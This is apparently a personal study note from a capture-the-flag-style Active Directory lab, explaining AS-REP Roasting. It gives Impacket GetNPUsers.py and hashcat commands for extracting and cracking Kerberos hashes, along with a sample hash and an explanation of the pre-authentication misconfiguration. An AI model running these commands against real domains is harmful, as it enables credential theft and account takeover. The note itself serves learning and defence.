
**Type:** Kerberos attack  
**Technique:** AS-REP Roasting  

### Tool → `GetNPUsers.py`

Checks domain users for **Kerberos pre-authentication disabled** accounts and requests an **AS-REP** response that can be cracked offline.

```bash
GetNPUsers.py spookysec.local/ \
-usersfile userlist.txt \
-no-pass \
-dc-ip <TARGET_IP>
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin
### Options

|Option|Meaning|
|---|---|
|`spookysec.local/`|Target AD domain|
|`-usersfile`|File containing usernames|
|`-no-pass`|Don't provide credentials|
|`-dc-ip`|Domain Controller IP|

### Example
```bash
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ \
-usersfile userlist.txt \
-no-pass \
-dc-ip 10.10.10.10
```

If a vulnerable account is found, you may get:
```text
$krb5asrep$23$svc-admin@THM-AD:f696dd4f7d6318571da51fe3cd795c6b$781221de5836f42ae8583df7cd6dcb92fe300c45f5061d186c7f1225d66e>
```

This is an **AS-REP hash** that can be taken offline for password cracking.
```bash
hashcat -m 18200 hash.txt rockyou.txt 
```
- `-m 18200` → krb5asrep hash mode.
- `hash.txt` → file containing the hash.

Show cracked passwords:
```bash
hashcat -m 18200 hash.txt --show
```



### Why does it work?

Normally, Kerberos requires the client to prove knowledge of the user's password **before the KDC returns the AS-REP**.

the user still sends an **AS-REQ**, but they don't have to include **Kerberos pre-authentication data** proving knowledge of the password.

If **Kerberos pre-authentication is disabled** for an account:

```text
Username
   │
   ▼
   KDC
   │
   │ Pre-authentication NOT required
   ▼
 AS-REP
   │
   ▼
Encrypted material
   │
   ▼
Offline password cracking
```

The returned AS-REP contains data encrypted using a key derived from the user's password. An attacker can therefore attempt to crack the password **offline**, without repeatedly contacting the domain controller.

### Key point

> **AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.**

**Vulnerability/misconfiguration:** `Do not require Kerberos preauthentication` enabled on a user account.

**Attack →** Enumerate users → Find accounts without pre-authentication → Request AS-REP → Obtain crackable material → Crack offline.